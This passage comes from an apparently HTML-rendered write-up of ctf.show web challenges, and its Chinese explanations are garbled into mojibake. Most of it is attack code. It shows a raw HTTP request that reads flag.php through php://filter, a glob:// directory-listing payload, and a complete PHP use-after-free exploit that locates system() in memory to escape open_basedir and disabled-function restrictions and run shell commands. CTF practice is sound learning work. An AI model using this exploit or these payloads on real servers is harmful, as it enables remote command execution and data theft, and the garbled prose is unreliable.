class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">POST /?<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php HTTP/1.1</span></span><br><span class="line">Host: eb8e8295-<span class="number">2</span>ab7-<span class="number">4522</span>-<span class="number">9</span>c27-d7d70b69c967.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">c=include $_GET[1];</span></span><br></pre></td></tr></table></figure><ul><li><p>POSTè¯·æ±‚è¦åŠ ä¸Š</p><p><code>Content-Type: application/x-www-form-urlencoded</code></p></li></ul><p>æˆ–è€…ç”¨èšå‰‘ç›´è¿</p><h4><span id="web71">web71</span></h4><ul><li>åœ¨ä»£ç æ‰§è¡Œç»“æŸåå¦‚æœæƒ³è·³è¿‡å…¶ä½™éƒ¨åˆ†ï¼Œå¯ä»¥ä½¿ç”¨<code>exit();</code>æˆ–è€…<code>die()</code>æ–¹æ³•é€€å‡º</li></ul><h4><span id="web72">web72</span></h4><p>å°è¯•è¯»å–æ ¹ç›®å½•ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$d</span>=opendir(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="built_in">echo</span><span class="string">&quot;<span class="variable">$f</span>\n&quot;</span>;&#125;;<span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure><ul><li>è¿™é¢˜éœ€è¦ç”¨globåè®®è¯»å–æ ¹ç›®å½•ï¼Œç„¶ååˆ©ç”¨uafè„šæœ¬å‘½ä»¤æ‰§è¡Œã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;glob:// /*.txt&quot;</span>;                         <span class="comment">//glob:///*.txtåº”è¯¥è¿èµ·æ¥å†™ï¼Œä¸­é—´ç©ºäº†ä¸€ä¸‹åªæ˜¯æ–¹ä¾¿ç†è§£</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>Payloadæ„é€ </p><p><code>c=$a=&quot;glob:///*.txt&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo &quot;filename:&quot;.$file.&quot;\n&quot;;&#125;closedir($b);&#125;exit();</code></p><p>å‘ç°<em>flag0.txt</em>æ–‡ä»¶</p><p>ä½†æ˜¯ç”±äº<code>open_basedir</code>çš„é™åˆ¶ï¼Œè¿˜æ˜¯ä¸å¯ä»¥ç›´æ¥includeè¿›æ¥ï¼Œéœ€è¦æƒ³å…¶å®ƒçš„åŠæ³•ã€‚ä½¿ç”¨UAFã€‚è„šæœ¬å¦‚ä¸‹ï¼šè®°å¾—è¦æŠŠ<code>c=</code>ä¹‹åçš„å†…å®¹urlç¼–ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="comment">#éœ€è¦é€šè¿‡urlç¼–ç å“¦</span></span><br></pre></td></tr></table></figure><h4><span id="web73">web73</span></h4><p>å…ˆè¯»å–ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 